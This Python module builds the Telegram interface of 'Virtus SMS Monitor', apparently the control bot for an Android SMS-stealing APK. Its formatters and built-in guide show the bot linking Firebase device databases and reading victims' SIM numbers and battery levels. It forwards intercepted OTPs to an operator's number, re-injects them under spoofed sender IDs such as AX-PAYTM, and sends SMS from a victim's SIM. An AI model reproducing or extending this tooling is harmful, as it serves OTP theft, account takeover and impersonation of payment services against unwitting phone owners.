import json
import secrets
from datetime import datetime, timezone

from telegram import InlineKeyboardButton, InlineKeyboardMarkup

from app.database import Device, MonitorProfile

STARTUP_TEST_SENDER = "BABY"
STARTUP_TEST_MESSAGE = "Chacha Ji Pani Pila Do"


def format_addchannel_card(channel_id: str, sim_slot: int = 1) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        f"📢 Channel: {channel_id}\n"
        f"📶 SIM: {sim_slot}"
        "</pre>"
    )


def format_firebase_connected_card(
    firebase_url: str,
    online_count: int,
    total: int = 0,
    device_ids: list[str] | None = None,
) -> str:
    device_line = (
        f"📱 Devices: {total} (online: {online_count})"
        if total
        else "📱 Devices: 0"
    )
    ids_block = ""
    if device_ids:
        preview = device_ids[:12]
        ids_block = "\n\nIDs:\n" + "\n".join(f"• {device_id}" for device_id in preview)
        if len(device_ids) > 12:
            ids_block += f"\n... +{len(device_ids) - 12} more"
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Firebase Connected!\n\n"
        f"URL: {firebase_url}\n"
        f"{device_line}"
        f"{ids_block}"
        "</pre>"
    )


def short_device_id(name: str) -> str:
    return name[:8] if len(name) > 8 else name


def make_inject_key(device: Device) -> str:
    if device.api_key and device.api_key.startswith("KEY-"):
        return device.api_key
    raw = (device.api_key or secrets.token_hex(8)).replace("-", "").upper()[:16]
    return f"KEY-{raw[0:4]}-{raw[4:8]}-{raw[8:12]}-{raw[12:16]}"


def get_device_meta(device: Device) -> dict:
    if not hasattr(device, "device_meta") or not device.device_meta:
        return {}
    try:
        return json.loads(device.device_meta)
    except (json.JSONDecodeError, TypeError):
        return {}


def get_sim_list(device: Device) -> list[dict]:
    meta = get_device_meta(device)
    sims = meta.get("sims")
    if sims:
        return sims

    primary = device.phone_number or "Unknown"
    return [
        {"slot": 1, "index": 0, "carrier": "SIM 1", "number": primary},
        {"slot": 2, "index": 1, "carrier": "SIM 2", "number": meta.get("sim2", "N/A")},
    ]


def _is_valid_sim_number(number: str | None) -> bool:
    if not number:
        return False
    normalized = str(number).strip().upper()
    return normalized not in {"N/A", "UNKNOWN", "NA", "-", "NONE", ""}


def get_active_sims(device: Device) -> list[dict]:
    sims = get_sim_list(device)
    active = [sim for sim in sims if _is_valid_sim_number(sim.get("number"))]
    if active:
        return active
    return sims[:1] if sims else [{"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}]


def get_selected_sim(device: Device, sim_index: int = 0) -> dict:
    sims = get_sim_list(device)
    if 0 <= sim_index < len(sims):
        return sims[sim_index]
    active = get_active_sims(device)
    return active[0] if active else {"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}


def get_inject_key(profile: MonitorProfile | None, device: Device) -> str:
    from app.license_keys import is_valid_license_key_format, license_key_exists

    license_key = (profile.license_key or "").strip().upper() if profile else ""
    if is_valid_license_key_format(license_key) and license_key_exists(license_key):
        return license_key
    device_key = (device.api_key or "").strip().upper()
    if is_valid_license_key_format(device_key) and license_key_exists(device_key):
        return device_key
    return "Not set — /key generate"


def get_battery(device: Device) -> str:
    meta = get_device_meta(device)
    battery = meta.get("battery") or meta.get("battery_level")
    if battery is None:
        return "N/A"
    text = str(battery).strip()
    if not text or text.lower() in {"unknown", "n/a", "na", "null", "none"}:
        return "N/A"
    return f"{text}%" if "%" not in text else text


def get_model_name(device: Device) -> str:
    meta = get_device_meta(device)
    return meta.get("model") or meta.get("device_model") or "Unknown"


def _sim_button_label(sim: dict) -> str:
    slot = sim.get("slot", 1)
    number = sim.get("number", "Unknown")
    carrier = (sim.get("carrier") or "").strip()
    if _is_valid_sim_number(number) and carrier and carrier.upper() not in {f"SIM {slot}", "SIM 1", "SIM 2"}:
        return f"📶 SIM {slot}: {carrier} ({number})"
    if _is_valid_sim_number(number):
        return f"📶 SIM {slot} ({number})"
    return f"📶 SIM {slot}"


def format_device_set_card(
    device: Device,
    selected_sim: int = 0,
    *,
    found_ms: int | None = None,
    status: str = "online",
) -> str:
    device_short = short_device_id(device.name)
    db_url = device.firebase_source_url or "Not linked"
    phone = device.phone_number or "Unknown"
    timing = f" ⚡ Found in {found_ms}ms" if found_ms is not None else ""
    if status == "online":
        status_line = "🟢 Online"
    elif status == "offline":
        status_line = "🔴 Offline"
    else:
        status_line = "🟡 Idle"

    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Device Found &amp; Set!\n\n"
        f"📱 {device_short}\n"
        f"📞 {phone}\n"
        f"🔋 {get_battery(device)}\n"
        f"{status_line}\n"
        f"🗄️ DB: {db_url}\n\n"
        f"Select SIM to send FROM:{timing}"
        "</pre>"
    )


def device_set_keyboard(device: Device) -> InlineKeyboardMarkup:
    rows = [
        [
            InlineKeyboardButton(
                _sim_button_label(sim),
                callback_data=f"sim:{device.id}:{sim['index']}",
            )
        ]
        for sim in get_active_sims(device)
    ]
    return InlineKeyboardMarkup(rows)


def sim_monitoring_keyboard(device: Device) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "🟢 Monitoring ON...",
                    callback_data=f"monitor:start:{device.id}",
                ),
                InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop"),
            ]
        ]
    )


def format_sim_selected_card(device: Device, sim_index: int = 0) -> str:
    active = get_selected_sim(device, sim_index)
    slot = active.get("slot", 1)
    number = active.get("number", "Unknown")
    carrier = active.get("carrier") or f"SIM {slot}"
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        f"📱 {short_device_id(device.name)}\n"
        f"📶 SIM {slot}: {carrier} ({number})\n"
        f"🔋 {get_battery(device)}"
        "</pre>"
    )


def format_number_pick_card(device: Device, sim_index: int = 0) -> str:
    active = get_selected_sim(device, sim_index)
    slot = active.get("slot", 1)
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        f"📶 SIM {slot} selected\n\n"
        "📞 Select number (OTP yahan jayega):"
        "</pre>"
    )


def _unique_forward_numbers(device: Device, profile: MonitorProfile | None) -> list[str]:
    from app.services import normalize_phone

    seen: set[str] = set()
    numbers: list[str] = []
    if profile and profile.phone_number:
        seen.add(profile.phone_number)
        numbers.append(profile.phone_number)
    for sim in get_active_sims(device):
        raw = sim.get("number")
        if not _is_valid_sim_number(raw):
            continue
        normalized = normalize_phone(str(raw))
        if normalized not in seen:
            seen.add(normalized)
            numbers.append(normalized)
    return numbers


def mynum_pick_keyboard(device: Device, profile: MonitorProfile | None) -> InlineKeyboardMarkup:
    rows = []
    selected = profile.phone_number if profile else None
    for number in _unique_forward_numbers(device, profile):
        label = f"📞 {number}"
        if number == selected and profile and profile.mynum_selected:
            label = f"✅ {number}"
        rows.append(
            [
                InlineKeyboardButton(
                    label,
                    callback_data=f"mynum:pick:{device.id}:{number}",
                )
            ]
        )
    rows.append([InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop")])
    return InlineKeyboardMarkup(rows)


def _short_channel_id(channel_id: str) -> str:
    if len(channel_id) > 12:
        return f"{channel_id[:5]}..."
    return channel_id


def format_timing_footer(queued_ms: int, total_ms: int) -> str:
    return f"⏱ queued {queued_ms}ms | total {total_ms}ms"


def format_virtus_startup_card(queued_ms: int = 3, total_ms: int = 15) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "⚡ INJECT FORWARDED! [STARTUP]\n\n"
        f"📩 Sender: {STARTUP_TEST_SENDER}\n"
        f"🔒 {STARTUP_TEST_MESSAGE}\n\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_virtus_stream_card(
    sender: str,
    message: str,
    queued_ms: int = 3,
    total_ms: int = 22,
) -> str:
    body = message.replace("<", "").replace(">", "").strip()
    if len(body) > 500:
        body = body[:500] + "..."
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "⚡ INJECT FORWARDED! [STREAM]\n\n"
        f"📩 Sender: {sender}\n"
        f"🔒 {body}\n\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_virtus_outgoing_sent_card(
    to_number: str,
    message: str,
    sim_slot: int = 1,
    queued_ms: int = 5,
    total_ms: int = 25,
) -> str:
    body = message.replace("<", "").replace(">", "").strip()
    if len(body) > 300:
        body = body[:300] + "..."
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "📤 OUTGOING SMS SENT! [CHANNEL]\n\n"
        f"📞 To: {to_number}\n"
        f"📶 SIM: {sim_slot}\n"
        f"🔒 {body}\n\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_virtus_channel_token_card(
    to_number: str,
    message: str,
    queued_ms: int = 5,
    total_ms: int = 29,
) -> str:
    body = message.replace("<", "").replace(">", "").strip()
    if len(body) > 500:
        body = body[:500] + "..."
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "🎯 TOKEN FORWARDED! [CHANNEL]\n\n"
        f"📞 To: {to_number}\n"
        f"🔒 {body}\n\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_auto_stop_card(minutes: int = 15) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        f"⏱ AUTO-STOPPED ({minutes} min)"
        "</pre>"
    )


def format_monitoring_card(
    device: Device,
    profile: MonitorProfile,
    ignored_sms: int = 0,
    test_message: str | None = None,
) -> str:
    sim_index = profile.selected_sim_index or 0
    active_sim = get_selected_sim(device, sim_index)
    sim_slot = active_sim.get("slot", 1)
    sim_number = active_sim.get("number", "Unknown")
    target = profile.phone_number or "Not set"
    channel = profile.channel_id or str(profile.telegram_user_id)
    auto_stop = profile.auto_stop_minutes or 15
    inject_key = get_inject_key(profile, device)
    test_msg = test_message or STARTUP_TEST_MESSAGE

    card = (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Monitoring Started!\n\n"
        f"📱 Device: {short_device_id(device.name)} | {get_model_name(device)}\n"
        f"📶 FROM SIM: {sim_slot} ({sim_number})\n"
        f"🔑 Inject Key: {inject_key}\n"
        "📤 Incoming -&gt; spoof inject (same sender ID)\n"
        f"📞 Real SMS -&gt; {target}\n"
        f"📢 Channel: {channel} (last / addchannel only)\n"
        f"⏱ Auto-stop in {auto_stop} minutes\n"
        f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
        f"✅ Test inject OK: {test_msg}"
        "</pre>"
    )

    if test_message and test_message != "Monitoring active" and test_message != test_msg:
        card += f"\n\n<pre>🔒 Last SMS: {test_message[:80]}</pre>"

    return card


def monitoring_keyboard(device: Device | None = None) -> InlineKeyboardMarkup:
    start_data = f"monitor:start:{device.id}" if device else "monitor:on"
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("🟢 Monitoring ON...", callback_data=start_data),
                InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop"),
            ]
        ]
    )


def format_welcome_message() -> str:
    return (
        "✅ <b>Virtus SMS Monitor</b>\n\n"
        "Sab commands: <code>/guide</code>"
    )


def format_guide_message() -> str:
    return (
        "📖 <b>COMMAND GUIDE</b>\n\n"
        "<b>Setup</b>\n"
        "<pre>"
        "/setfirebase &lt;url&gt;     Firebase connect\n"
        "/allfirebase              Bulk .txt import\n"
        "/fdy &lt;device_id&gt;         Device find (bina key)\n"
        "/a &lt;device_id&gt;            Device find (key ke saath)\n"
        "/mynum &lt;number&gt;           OTP inject target number\n"
        "/addchannel &lt;id&gt;          Channel set (bot admin)\n"
        "/startmonitor             Monitoring ON\n"
        "</pre>\n\n"
        "<b>KEY (APK + bot same key)</b>\n"
        "<pre>"
        "/key generate             Nayi KEY\n"
        "/key KEY-XXXX-XXXX-...    KEY set\n"
        "/key confirm              APK verify\n"
        "/key status KEY-...       Devices status\n"
        "</pre>\n\n"
        "<b>Monitor</b>\n"
        "<pre>"
        "/stop                     Monitoring OFF\n"
        "/resume                   Monitoring ON\n"
        "/status                   Current stats\n"
        "/send &lt;num&gt; &lt;msg&gt;       Manual SMS (selected SIM)\n"
        "/ping                     Bot latency\n"
        "</pre>\n\n"
        "<b>Device aliases</b>\n"
        "<pre>"
        "/fy /fb /la /setdevice    Same as /fdy\n"
        "/devices                  Active device card\n"
        "/device &lt;name&gt;           Device info\n"
        "</pre>\n\n"
        "<b>Channel SMS format</b>\n"
        "<pre>"
        "To: 9876543210\n"
        "Message: apna text\n"
        "→ Selected SIM se real SMS"
        "</pre>\n\n"
        "<b>Incoming OTP</b>\n"
        "<pre>"
        "Monitoring ON → inject /mynum par\n"
        "Same sender ID (AX-PAYTM, etc.)\n"
        "Test msg: Chacha Ji Pani Pila Do"
        "</pre>\n\n"
        "<b>Buttons flow</b>\n"
        "<pre>"
        "1. 📶 SIM 1/2 select\n"
        "2. 📞 Number select (OTP target)\n"
        "3. 🟢 Monitoring ON (msg pinned)"
        "</pre>\n\n"
        "<b>Admin</b>\n"
        "<pre>"
        "/approve &lt;telegram_id&gt;\n"
        "/revoke &lt;telegram_id&gt;\n"
        "/users\n"
        "/recent /search /stats"
        "</pre>"
    )


def format_status_card(device: Device | None, profile: MonitorProfile | None, sms_count: int = 0) -> str:
    if not profile:
        return "❌ <code>/setfirebase &lt;url&gt;</code>"

    monitoring = "🟢 ON" if profile.is_monitoring else "🔴 OFF"
    device_name = short_device_id(device.name) if device else "Not set"
    sims = get_sim_list(device) if device else []
    sim_index = profile.selected_sim_index or 0
    sim_label = sims[sim_index]["carrier"] if sims else "N/A"

    return (
        "✅ <b>STATUS</b>\n\n"
        "<pre>"
        f"Monitor: {monitoring}\n"
        f"📱 Device: {device_name}\n"
        f"📶 SIM: {sim_label}\n"
        f"📞 My Number: {profile.phone_number or 'Not set'}\n"
        f"📢 Channel: {profile.channel_id or 'Not set'}\n"
        f"🔥 Firebase: {'Connected' if profile.firebase_url else 'Not set'}\n"
        f"📨 SMS Count: {sms_count}\n"
        f"⏱ Auto-stop: {profile.auto_stop_minutes or 15} min"
        "</pre>"
    )


def format_ping_card(latency_ms: int) -> str:
    return (
        "✅ <b>PONG</b>\n\n"
        "<pre>"
        f"🏓 Latency: {latency_ms}ms\n"
        "Bot is online and ready!"
        "</pre>"
    )


def format_key_error_card() -> str:
    return "❌ <code>/key generate</code> ya <code>/key KEY-XXXX</code> — /guide"


def format_key_generated_card(license_key: str) -> str:
    return (
        "✅ <b>KEY GENERATED</b>\n\n"
        f"<pre>🔑 {license_key}</pre>"
    )


def format_key_set_card(inject_key: str) -> str:
    return (
        "✅ <b>KEY SET</b>\n\n"
        f"<pre>🔑 {inject_key}</pre>"
    )


def format_license_key_set_card(firebase_url: str) -> str:
    return (
        "✅ <b>KEY SET</b>\n\n"
        f"<pre>🔑 {firebase_url.upper()}</pre>"
    )


def format_send_queued(to_number: str, message: str, sim_slot: int) -> str:
    return (
        "✅ <b>SMS Queued</b>\n\n"
        "<pre>"
        f"📶 SIM: {sim_slot}\n"
        f"📞 To: {to_number}\n"
        f"💬 {message[:200]}"
        "</pre>"
    )


def update_device_meta(device: Device, data: dict) -> dict:
    meta = get_device_meta(device)
    meta.update(data)
    return meta
